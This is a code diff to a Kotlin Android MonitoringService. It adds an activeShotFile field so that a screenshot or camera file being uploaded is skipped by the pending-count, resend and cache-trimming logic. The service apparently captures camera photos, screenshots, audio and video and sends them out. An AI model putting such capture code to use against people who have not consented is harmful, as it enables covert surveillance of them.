@@ -64,6 +64,7 @@ class MonitoringService : Service() {
     private var activeAudioFile: File? = null
     @Volatile
     private var activePhotoFile: File? = null
+    private var activeShotFile: File? = null
     @Volatile
     private var activeVideoFile: File? = null
     private var ringJob: Job? = null
@@ -2997,7 +2998,7 @@ class MonitoringService : Service() {
                     }
                     return@launch
                 }
-                activePhotoFile = shotFile
+                activeShotFile = shotFile
                 try {
                     when (sendPhotoFile(shotFile)) {
                         MediaSendOutcome.SENT -> flushPendingPhotos()
@@ -3015,7 +3016,7 @@ class MonitoringService : Service() {
                         }
                     }
                 } finally {
-                    activePhotoFile = null
+                    activeShotFile = null
                 }
                 shotBusy.set(false)
             } catch (e: kotlinx.coroutines.CancellationException) {
@@ -3234,7 +3235,7 @@ class MonitoringService : Service() {
     private fun pendingPhotoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
-                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && file != activePhotoFile
+                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && file != activePhotoFile && file != activeShotFile
             }?.size ?: 0
         } catch (_: Exception) {
             0
@@ -4093,7 +4094,7 @@ class MonitoringService : Service() {
             val now = System.currentTimeMillis()
             var droppedPhotos = 0
             for (file in pending) {
-                if (file == activePhotoFile) continue
+                if (file == activePhotoFile || file == activeShotFile) continue
                 if (now - file.lastModified() < 10_000L) continue
                 val photoOutcome = sendPhotoFile(file)
                 if (photoOutcome == MediaSendOutcome.KEPT) break
@@ -4129,7 +4130,7 @@ class MonitoringService : Service() {
             }
             val photos = cacheDir.listFiles { file ->
                 file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
-            }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile } ?: return
+            }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile && it != activeShotFile } ?: return
             val dropped = photos.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
